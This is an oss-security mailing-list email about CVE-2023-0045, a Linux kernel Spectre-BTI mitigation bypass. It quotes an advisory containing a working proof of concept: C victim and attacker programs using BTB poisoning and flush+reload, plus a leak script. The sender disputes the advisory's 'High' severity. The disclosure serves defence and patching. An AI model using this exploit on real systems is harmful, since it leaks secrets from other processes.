Received: (qmail 30305 invoked by uid 550); 4 Feb 2023 22:55:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1236 invoked from network); 4 Feb 2023 20:51:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=kernelhacking-com.20210112.gappssmtp.com; s=20210112;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :from:to:cc:subject:date:message-id:reply-to;
        bh=nOGalkhthhQgQyUvzBmGlQZOjdvtdNMecP+5nxZ7GwU=;
        b=ER4PtUBYlw1w+L7zrvisOwSaJzeMXjqyfSGwk4QaRA4HqIcqzXkMRjS5FbHROR64Of
         XqDZCupnD8X3xISr5dOGFTFDFArIBMQ4lTcctEMkLy6MkkAHyz1TDbHNasf+bUGutkUs
         5mf9cLZ7FUA42ANcBDQvPmQvfxJGRrFkw2R1ERiWy+Ezv6v2AqtJf5tWyk2mBjftBMsk
         9FP6sCSZZx2V2nUxBalC4uYdv0dm8u0qvdgPtQCvkZ9JnOePFfLJUSXNWhaNKnohu9GI
         uhvDTJ0KS3Ul6krEY8A98RNIH57A0s4LLKPimz7hVEbXx8Tb+zHhd6zotni8e+MEBDVS
         IehQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=nOGalkhthhQgQyUvzBmGlQZOjdvtdNMecP+5nxZ7GwU=;
        b=NQ+UgL1vd6fkGgHNnaQCjY+8pSpGSvOam+honj+H1Ly9NMRxiJcEOTTaH14Dl/SEE8
         NXHDIenj+aiL4ixBqIAf5viDJNevZO7uW1zT1xaGLleX+CTO38qy6Bn8MdZbR0Pf88FZ
         VVrZ2ujZNapU3xWq+GHoVnvAvz6eWvcRnqn04ISTxMyCMLY6v9j+rXrYThEd1qW2hBmP
         DBExeUdZ8nN594N4zaVHJhW1nPZSN/aqpxXFqCPNmdhpoWNb2uMzGiH324M0a3USv4L6
         YulNjkHwX8ljBb3doq6jK33+K9tvX5MN2TZ80tb57rwQr2CD2gOJORm2QD2UA2MQCvk0
         UBZQ==
X-Gm-Message-State: AO0yUKW6DeVmvW9wNGyAafKrn8JY83VZ55Oo1pvxZLlOSAZewIvIyRjA
	1LI/NinmetLPsnzUfomrrIkFMZgRZpVUZa5MF2CZCxkWDhRKfg==
X-Google-Smtp-Source: AK7set8hd3L+gWGGnh4Lc7z4G5hUf0rnk2mu1XnhNQBw6PayWoY/JI4aE0PLsNgzyiFuaeYp+WLpuEQQ9oyUnZmttFc=
X-Received: by 2002:a17:906:b187:b0:88a:f44e:4878 with SMTP id
 w7-20020a170906b18700b0088af44e4878mr4621840ejy.199.1675543905367; Sat, 04
 Feb 2023 12:51:45 -0800 (PST)
MIME-Version: 1.0
References: <CAFXgH+NM7C5r0sVf52ZvO+=vP5sC6=BPBO2paJQN19H5KZcB_Q@mail.gmail.com>
 <CAL6-1qUipy9eFMEH9=mVsnpyAtwcfNf8oFx9BVvqz89sfu2MkQ@mail.gmail.com>
In-Reply-To: <CAL6-1qUipy9eFMEH9=mVsnpyAtwcfNf8oFx9BVvqz89sfu2MkQ@mail.gmail.com>
From: Rodrigo Branco <rodrigo@kernelhacking.com>
Date: Sat, 4 Feb 2023 14:51:30 -0600
Message-ID: <CAL6-1qWtLqDf8+Gcf7+97yTAAc2UM8W7jvd__JytHSBKBs99Cg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000490c7d05f3e5f770"
Subject: Re: [oss-security] CVE-2023-0045: Linux Kernel: Bypassing Spectre-BTI
 User Space Mitigations

--000000000000490c7d05f3e5f770
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Here is the original write-up:
https://github.com/es0j/CVE-2023-0045

I am already talking to Rafael from Google to get their version updated.

The impact is low and would only affect applications that immediately load
secrets after the prctl() call.


Best regards,


On Fri, Feb 3, 2023, 12:59 PM Rodrigo Branco <rodrigo@kernelhacking.com>
wrote:

> I am sorry but that is not Jose's and mine write-up.  We disagree
> vehemently with the severity of the issue marked as high. Also, the
> description, implications and target are all wrong.
>
> I will work with Google folks to send an updated version but recommend
> that others ignore the conclusions and implications for now.  I am
> available if anyone needs to discuss further.
>
>
> Best regards,
>
> On Fri, Feb 3, 2023, 10:20 AM Rafael Correa De Ysasi <
> rcorreadeysasi@chromium.org> wrote:
>
>> Summary
>>
>> The Linux kernel does not correctly mitigate SMT attacks, as discovered
>> through a strange pattern in the kernel API using STIBP as a mitigation[1
>> <https://docs.kernel.org/userspace-api/spec_ctrl.html>], leaving the
>> process exposed for a short period of time after a syscall. The kernel
>> also
>> does not issue an IBPB immediately during the syscall.
>> The ib_prctl_set [2
>> <
>> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bug=
s.c#L1467
>> >]function
>> updates the Thread Information Flags (TIFs) for the task and updates the
>> SPEC_CTRL MSR on the function __speculation_ctrl_update [3
>> <
>> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process=
.c#L557
>> >],
>> but the IBPB is only issued on the next schedule, when the TIF bits are
>> checked. This leaves the victim vulnerable to values already injected on
>> the BTB, prior to the prctl syscall.
>> The behavior is only corrected after a reschedule of the task happens.
>> Furthermore, the kernel entrance (due to the syscall itself), does not
>> issue an IBPB in the default scenarios (i.e., when the kernel protects
>> itself via retpoline or eIBRS).
>> Severity
>>
>> High - The inability to correctly mitigate SMT attacks, leaves the kernel
>> exposed for an attacker to inject malicious code into the running kernel,
>> which could lead to a complete compromise of the system.
>> Proof of Concept
>>
>> To ensure this wasn't a measurement error, we created a simple POC. The
>> victim code always executes asafe_function through a function pointer th=
at
>> is vulnerable to a spectre-BTI attack. The victim requests the kernel for
>> protection using the prctl syscall (inside protect_me). The victim also
>> loads a secret from a text file, showing that other syscalls don=E2=80=
=99t check
>> the TIF bit or provoke a reschedule that would force an IBPB.
>>
>> //gcc -o victim victim.c -O0 -masm=3Dintel -no-pie -fno-stack-protector
>> #include "common.h"
>>
>> int main(int argc, char *argv[])
>> {
>>
>>     setvbuf(stdout, NULL, _IONBF, 0);
>>     printf("running victim %s\n", argv[1]);
>>
>>     //only call safe_function
>>     codePtr =3D safe_function;
>>     char secret[20];
>>     char *sharedmem =3D open_shared_mem();
>>     unsigned idx =3D string_to_unsigned(argv[1]);
>>
>>     //call for prctl to protect this process
>>     protect_me();
>>
>>     //only then load the secret into memory
>>     load_secret(secret);
>>
>>     for (int i =3D 0; i < 100; i++)
>>     {
>>         flush((char *)&codePtr);
>>         //this arguments are never used on safe_function, but they
>> match the signature of spectre_gadget, that should never be called
>>         //Since prctl is called, it shouldn't be possible for an
>> attacker to poison the BTB and leak the secret
>>         spec(&sharedmem[2000], secret, idx);
>>     }
>> }
>>
>> Most of the libc functions were placed inside a common header between the
>> attacker and the victim, so the spectre_gadget and spec functions share
>> the
>> same memory addresses on both victim and attacker (otherwise a .GOT entry
>> is created and the addresses are changed). This is not a requirement and
>> there are other ways to place the branches on the same addresses and mim=
ic
>> the victim context, but this method is the simplest.
>>
>> #include <stdlib.h>
>> #include <sys/mman.h>
>> #include <fcntl.h>
>> #include <unistd.h>
>> #include <stdio.h>
>> #include <sys/prctl.h>
>>
>> char unused[0x1000];
>> void (*codePtr)(char *, char *, unsigned idx);
>> char unused2[0x1000];
>>
>> // this function does nothing. Always called by the victim
>> void safe_function(char *a, char *b, unsigned idx)
>> {
>> }
>>
>> // this function is never called by the victim
>> void spectre_gadget(char *addr, char *secret, unsigned idx)
>> {
>>     volatile char d;
>>     if ((secret[idx / 8] >> (idx % 8)) & 1)
>>         d =3D *addr;
>> }
>>
>> // helper for better results probably not necessary but makes the tests
>> easier
>> void flush(char *adrs)
>> {
>>     asm volatile(
>>         "clflush [%0]                   \n"
>>         :
>>         : "c"(adrs)
>>         :);
>> }
>>
>> // This function is vulnerable to a spectre-BTI attack.
>> void spec(char *addr, char *secret, unsigned idx)
>> {
>>
>>     for (register int i =3D 0; i < 30; i++)
>>         ;
>>     codePtr(addr, secret, idx);
>> }
>>
>> // opens file as read only in memory to be used as side channel, but
>> could be any other COW file like libc for example
>> char *open_shared_mem()
>> {
>>     int fd =3D open("sharedmem", O_RDONLY);
>>     char *res =3D (char *)mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd,=
 0);
>>     // ensure page is on memory
>>     volatile char d =3D res[2100];
>>     return res;
>> }
>>
>> // load secret from file
>> void load_secret(char *secret)
>> {
>>     FILE *fp =3D fopen("secret.txt", "r");
>>     fgets(secret, 20, (FILE *)fp);
>> }
>>
>> // Calls prctl to protect the user against spectre-BTI attacks -
>> https://docs.kernel.org/userspace-api/spec_ctrl.html
>> void protect_me()
>> {
>>     usleep(1000); //not needed but resets the available time on scheduler
>>     prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH,
>> PR_SPEC_FORCE_DISABLE, 0, 0);
>> }
>>
>> // Utility. All utility functions are placed on common so the spec
>> function matches the same address on both victim and attacker. This is
>> not necessary but makes the tests easier
>> unsigned string_to_unsigned(char *s)
>> {
>>     return atoi(s);
>> }
>>
>>
>> The attack consists in poisoning the BTB by calling the spec function and
>> making it branch to spectre_gadget instead of safe_function. After the
>> training the victim process is created and it executes spec that
>> mispredicts to spectre_gadget which should never be executed. The secret
>> is
>> leaked through a classic flush+reload side channel.
>>
>> //gcc -o attacker attacker.c -O0 -masm=3Dintel -no-pie -fno-stack-protec=
tor
>> #include "common.h"
>>
>> #define PRINTNUM 1000
>>
>> unsigned probe(char *adrs)
>> {
>>     volatile unsigned long time;
>>     asm __volatile__(
>>         "    mfence             \n"
>>         "    lfence             \n"
>>         "    rdtsc              \n"
>>         "    lfence             \n"
>>         "    mov esi, eax       \n"
>>         "    mov eax,[%1]       \n"
>>         "    lfence             \n"
>>         "    rdtsc              \n"
>>         "    sub eax, esi       \n"
>>         "    clflush [%1]       \n"
>>         "    mfence             \n"
>>         "    lfence             \n"
>>         : "=3Da"(time)
>>         : "c"(adrs)
>>         : "%esi", "%edx");
>>     return time;
>> }
>>
>> int main(int argc, char *argv[])
>> {
>>
>>     //Make spec function confuse safe_function with spectre_gadget
>>     codePtr =3D spectre_gadget;
>>
>>     char dummy;
>>     int hits =3D 0;
>>     int tries =3D 0;
>>     char *sharedmem =3D open_shared_mem();
>>     setvbuf(stdout, NULL, _IONBF, 0);
>>
>>     while (1)
>>     {
>>         //Inject the target in the BTB
>>         spec(&dummy, &dummy, 0);
>>
>>         //Allow for victim to execute and misspredict to spectre_gadget
>>         usleep(1);
>>
>>         //probe the 1-bit flush+reload side channel
>>         if (probe((char *)&sharedmem[2000]) < 0x90)
>>         {
>>             printf("+");
>>         }
>>     }
>> }
>>
>> Since the victim receives an argument that can be used to choose the bit
>> to
>> be leaked through the side channel, we can execute the victim process
>> multiple times while the attacker is executing:
>>
>> taskset -c 0 ./attacker >> result.txt &
>>
>> for i in {0..144}
>> do
>>     echo "Leaking bit $i... "
>>     echo -e -n "Leaking bit $i: " >> result.txt
>>     sleep .01
>>     for j in {0..10}
>>     do
>>         taskset -c 0 ./victim $i >/dev/null
>>     done
>>
>>     echo "" >> result.txt
>> done
>>
>> python3 parseResult.py
>>
>> make clean
>> echo -e "killing attacker"
>> kill -9 $(pidof attacker)
>>
>> This leaves the following text file:
>>
>> Leaking bit 0: +++++++++++
>> Leaking bit 1:
>> Leaking bit 2:
>> Leaking bit 3:
>> Leaking bit 4:
>> Leaking bit 5:
>> Leaking bit 6: ++++++++++
>> Leaking bit 7:
>> Leaking bit 8: ++++++++
>> [...]
>>
>> Note that bit 0 and 6 are 1, therefore the first character must be
>> 0x41(A).
>> Parsing the file with a simple Python script shows:The secret leaked is:
>> b'Asuper_secret_flag' which is the exact content present in secret.txt
>> used
>> by the victim.
>> Changing the prctl call for seccomp to
>> syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0); after loading the secr=
et
>> doesn't prevent the attack. This is expected since internally both use t=
he
>> same ib_prctl_set function to implement the mitigation.
>> Further Analysis
>>
>> The current implementation of the prctl syscall for speculative control
>> fails to protect the user against attackers executing before the
>> mitigation. The seccomp mitigation also fails in this scenario.
>> The patch that added support for the conditional mitigation via prctl
>> (ib_prctl_set) dates back to the kernel 4.9.176. It appears to have been
>> introduced on Nov 28, 2018 in the following commit: torvalds/linux@9137b=
b2
>> <
>> https://github.com/torvalds/linux/commit/9137bb27e60e554dab694eafa4cca24=
1fa3a694f
>> >
>> and
>> the current __speculation_ctrl_update code that sets the MSRs, but witho=
ut
>> the immediate IBPB, was added on the same day in the following commit:
>> torvalds/linux@01daf56
>> <
>> https://github.com/torvalds/linux/commit/01daf56875ee0cd50ed496a09b20eb3=
69b45dfa5
>> >.
>> This indicates that the issue has been present in the kernel for about 4
>> years.
>> Mitigations
>>
>> For user-mode applications, a usleep after the prctl call is enough to
>> force a reschedule and ensure the correct mitigation. One possible kernel
>> patch for this attack is to issue the IBPB just after the STIBP is set, =
on
>> __speculation_ctrl_update [3
>> <
>> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process=
.c#L557
>> >]
>> or to call schedule(). After discussing with the Linux Kernel Security
>> Team, that is what was decided, and the following commit has the fix:
>>
>> https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=
=3Da664ec9158eeddd75121d39c9a0758016097fa96
>> .
>> Patch
>>
>> This was addressed in the following [commit].(
>>
>> https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/=
arch/x86/kernel/cpu/bugs.c?h=3Dv6.1.9&id=3De8377f0456fb6738a4668d4df16c13d7=
599925fd
>> )
>> Timeline
>>
>> *Date reported*: 12/30/2022
>> *Date fixed*: 01/04/2023
>> *Date disclosed*: 02/03/2023
>>
>

--000000000000490c7d05f3e5f770--
